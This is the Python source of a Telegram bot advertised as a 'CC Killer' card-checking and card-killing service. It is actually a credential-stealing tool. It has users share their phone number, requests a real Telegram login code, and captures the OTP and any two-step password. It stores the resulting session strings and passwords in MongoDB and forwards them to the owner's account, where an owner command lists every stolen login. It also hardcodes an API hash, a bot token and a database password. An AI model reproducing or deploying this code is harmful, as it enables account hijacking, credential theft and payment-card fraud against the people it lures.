import asyncio
import re
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import (
    Message, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetPassword
from telethon.tl.functions.auth import CheckPassword
from telethon.tl.types import InputCheckPasswordSRP
from pymongo import MongoClient
import threading
import hashlib

API_ID = 29657994
API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
BOT_TOKEN = "8009070392:AAF2e26nQnu49Z9Z8UHJFNOPivSGLMjzb-o"
OWNER_USERNAME = "@Rishu1286"
MONGO_URL = "mongodb+srv://Krishna:pss968048@cluster0.4rfuzro.mongodb.net/?retryWrites=true&w=majority"

mongo = MongoClient(MONGO_URL)
db = mongo["cc_killer"]
sessions_col = db["sessions"]

user_data = {}

app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
flask_app = Flask("rishu")


@flask_app.route("/")
def home():
    return "Bot is running"


@app.on_message(filters.command("start"))
async def start(client, message: Message):
    keyboard = [[InlineKeyboardButton("Register", callback_data="register")]]
    markup = InlineKeyboardMarkup(keyboard)
    text = (
        "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
        f"ʜᴇʏ {message.from_user.first_name}\n\n"
        "* ⌁ How it Works ! *\n\n"
        "ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁\n"
        "[✓] /cu  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
        "[✓] /b3  [card_details] ⌁ ᴄʜᴇᴄᴋ ᴄᴀʀᴅ\n"
    )
    await message.reply_text(text, reply_markup=markup)


@app.on_callback_query(filters.regex("register"))
async def inline_register(client, callback_query: CallbackQuery):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await callback_query.message.reply_text("Please share your phone number.", reply_markup=markup)


@app.on_message(filters.command("register"))
async def register(client, message: Message):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("Please share your phone number.", reply_markup=markup)


@app.on_message(filters.contact)
async def handle_contact(client, message: Message):
    user_id = message.chat.id
    phone = message.contact.phone_number
    await message.reply_text("Sending OTP...")

    try:
        tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await tele_client.connect()
        result = await tele_client.send_code_request(phone)
        user_data[user_id] = {
            "client": tele_client,
            "phone_number": phone,
            "phone_code_hash": result.phone_code_hash,
            "otp": ""
        }

        buttons = [
            [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(1, 4)],
            [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(4, 7)],
            [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(7, 10)],
            [InlineKeyboardButton("0", callback_data="otp_0"),
             InlineKeyboardButton("⌫", callback_data="otp_back"),
             InlineKeyboardButton("✅ Submit", callback_data="otp_submit")]
        ]

        await message.reply_text("Enter OTP:", reply_markup=InlineKeyboardMarkup(buttons))
    except Exception as e:
        await message.reply_text(f"Error: {str(e)}")


@app.on_callback_query(filters.regex("otp_"))
async def handle_otp_input(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    action = callback_query.data.split("_")[1]

    if user_id not in user_data:
        await callback_query.answer("Session expired. Please restart.", show_alert=True)
        return

    if action == "back":
        user_data[user_id]["otp"] = user_data[user_id]["otp"][:-1]
    elif action == "submit":
        fake = callback_query.message
        fake.from_user = callback_query.from_user
        fake.chat = callback_query.message.chat
        fake.text = user_data[user_id]["otp"]
        await handle_otp_or_password(client, fake)
        return
    else:
        user_data[user_id]["otp"] += action

    await callback_query.edit_message_text(
        f"Entered OTP: `{user_data[user_id]['otp']}`",
        reply_markup=callback_query.message.reply_markup
    )


async def handle_otp_or_password(client: Client, message: Message):
    user_id = message.chat.id
    if user_id not in user_data:
        return

    data = user_data[user_id]
    tclient = data["client"]

    if data.get("awaiting_password"):
        password = message.text.strip()
        try:
            pw = await tclient(GetPassword())
            pwd_hash = hashlib.sha256((pw.current_salt + password.encode() + pw.current_salt)).digest()
            await tclient(CheckPassword(password=InputCheckPasswordSRP(
                srp_id=pw.srp_id,
                A=pw.srp_B,
                M=pwd_hash
            )))

            session = tclient.session.save()

            sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "user_id": user_id,
                    "phone_number": data["phone_number"],
                    "session": session,
                    "password": password
                }}, upsert=True
            )

            await client.send_message(OWNER_USERNAME, f"2FA login successful for `{data['phone_number']}`.\nSession: `{session}`\nPassword: `{password}`")
            await message.reply_text("2FA login successful!")
        except Exception as e:
            await message.reply_text(f"2FA login failed: {e}")
        finally:
            await tclient.disconnect()
            user_data.pop(user_id, None)
        return

    otp = message.text.strip()
    try:
        await tclient.sign_in(data["phone_number"], otp, phone_code_hash=data["phone_code_hash"])
        session = tclient.session.save()

        sessions_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "user_id": user_id,
                "phone_number": data["phone_number"],
                "session": session,
                "password": None
            }}, upsert=True
        )

        await client.send_message(OWNER_USERNAME, f"Login success for `{data['phone_number']}`.\nSession: `{session}`")
        await message.reply_text("Login successful!")
        await tclient.disconnect()
        user_data.pop(user_id, None)

    except SessionPasswordNeededError:
        await message.reply_text("2FA is enabled. Send your password:")
        user_data[user_id]["awaiting_password"] = True
    except PhoneCodeInvalidError:
        await message.reply_text("Invalid OTP. Try again.")
    except Exception as e:
        await message.reply_text(f"Login failed: {e}")
        await tclient.disconnect()
        user_data.pop(user_id, None)


@app.on_message(filters.command("rishu"))
async def rishu_check(client, message: Message):
    if message.from_user.username != OWNER_USERNAME.strip("@"):
        return

    users = sessions_col.find()
    text = "**Logged-in Users:**\n\n"
    for user in users:
        text += f"**Phone:** `{user['phone_number']}`\n**Session:** `{user['session']}`"
        if user.get("password"):
            text += f"\n**Password:** `{user['password']}`"
        text += "\n\n"

    await message.reply_text(text or "No sessions yet.")


if __name__ == "__main__":
    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=8080)).start()
    app.run()
